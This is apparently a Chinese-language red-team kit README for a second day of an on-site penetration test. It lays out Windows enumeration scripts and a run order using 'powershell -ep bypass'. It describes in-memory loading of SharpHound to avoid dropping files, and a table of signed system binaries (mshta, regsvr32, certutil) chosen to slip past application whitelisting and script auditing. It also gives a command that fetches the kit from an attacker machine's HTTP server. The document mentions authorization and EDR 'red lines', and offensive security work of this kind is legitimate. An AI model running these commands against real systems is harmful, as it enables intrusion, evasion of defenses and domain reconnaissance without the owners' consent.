# Day2 作战包 — 高信任执行 + 权限面检测

针对现场约束（应用白名单按单文件放行、exe 下载拦截、防火墙全开、普通域用户）设计。
所有脚本只调用 **Windows 自带签名程序**（cmd/powershell/wscript/cscript/mshta/net*/wmic/sc/reg/icacls/schtasks/nltest 等），
不落地未知 PE，输出全部走文本日志，便于报告取证。

## 目录

```
day2-kit/
├─ bat/          cmd 枚举套件（优先用，信任度最高）
│   ├─ 00-context.bat      身份/会话/本地管理员组
│   ├─ 01-sysinfo.bat      系统信息/补丁/已装软件（注册表）
│   ├─ 02-net-recon.bat    网卡/路由/邻居/监听/防火墙/DNS缓存
│   ├─ 03-domain.bat       域控/信任/域组/域用户（nltest/net）
│   ├─ 04-services.bat     服务/进程/未引号路径候选
│   ├─ 05-privesc.bat      AlwaysInstallElevated/自启/计划任务/icacls/令牌特权
│   ├─ 06-av-check.bat     安全产品进程服务注册表确认
│   ├─ 07-schtasks.bat     计划任务/启动项
│   └─ 99-run-all.bat      一键全部执行 → out/\
├─ wsh/          Windows Script Host 版（wscript/cscript 签名解释器）
│   ├─ enum-system.vbs     WMI 全量系统枚举
│   ├─ enum-network.js     WMI 网络枚举 + route/arp/netstat
│   └─ run-all.wsf         单文件组合套件
├─ ps1/          PowerShell 载荷
│   ├─ Get-LocalRecon.ps1  自写轻量侦察（无已知工具特征）
│   ├─ Load-Assembly.ps1   内存加载 .NET 程序集（execute-assembly 等价物）
│   └─ Invoke-Suite.ps1    一键跑已备工具（PowerUp/JAWS/SessionGopher/PowerView/SharpHound）
├─ tools/        已下载工具源（供内存加载，勿直接双击 exe）
│   ├─ PowerUp.ps1 / PowerView.ps1 / jaws-enum.ps1 / SessionGopher.ps1 / PrivescCheck.ps1
│   └─ sharphound/SharpHound.exe + SharpHound.ps1
├─ out/          所有脚本输出日志（默认生成位置）
└─ manifest.sha256   全文件哈希（同时可提交应用白名单审批）
```

## 明天怎么跑（建议顺序）

1. **00→07 的 bat**：`99-run-all.bat` 一把梭，产物在 `out/`。这些只读枚举，触发行为监控概率低。
2. **WSH**：`cscript //nologo wsh\run-all.wsf` —— 如果应用白名单对 .bat 有额外规则，wscript/cscript 是签名解释器，通常放行。
3. **自写 PS**：`powershell -ep bypass -file ps1\Get-LocalRecon.ps1`
4. **已知工具**（有特征签名，谨慎）：
   ```powershell
   powershell -ep bypass
   . .\ps1\Invoke-Suite.ps1 -Tool PowerUp      # 本地提权面
   . .\ps1\Invoke-Suite.ps1 -Tool PowerView    # 域内 ACL/委派/组
   . .\ps1\Invoke-Suite.ps1 -Tool SharpHound   # 域图谱收集（LDAP，量大，建议报备后跑）
   ```
5. **SharpHound 内存加载**（不落地）：
   ```powershell
   . .\ps1\Load-Assembly.ps1
   Invoke-AssemblyInMemory -Path .\tools\sharphound\SharpHound.exe -Args '-c','All','--outputdirectory',$env:TEMP
   ```

## 高信任执行通道备忘

| 通道 | 用途 | 说明 |
|---|---|---|
| cmd / bat | 枚举主通道 | Day1 已确认可用 |
| powershell -ep bypass -enc | 内存加载/传输 | Day1 已确认可用；命令行审计会留记录 |
| cscript / wscript | .vbs/.js/.wsf | WSH 签名解释器，绕过部分脚本审计 |
| mshta | 运行 .hta/.vbs 片段 | 常被应用白名单放行（微软签名） |
| rundll32 | 执行 dll 导出 | 需白名单 dll，慎用 |
| regsvr32 | scrobj 注册 | Squiblydoo 类，EDR 有行为规则，非必要不用 |
| certutil -urlcache | 文件传输备选 | 直连下载 exe 被网关拦，走热点 HTTP 时可用 |
| go.exe（现场已装） | 本地编译 | 产物是 PE 落地即受限 → 编译后用 Load-Assembly 内存加载 |

## 文件进场

沿用 Day1 热点方案：攻击机 `python3 -m http.server 8000`（只绑热点网段），
测试机 `powershell -ep bypass -c "iwr http://<攻击机>:8000/day2-kit.zip -OutFile $env:TEMP\k.zip; Expand-Archive $env:TEMP\k.zip $env:TEMP\k"`。

## 红线（EDR 敏感，先报备再动）

- LSASS 访问 / 凭据导出
- 服务创建、计划任务写入、令牌操作
- 任何提权尝试触发的进程注入
- 跨域探测（先拿书面授权）

安全产品都会留日志，防守方可复盘：每一步都要能对应授权范围。
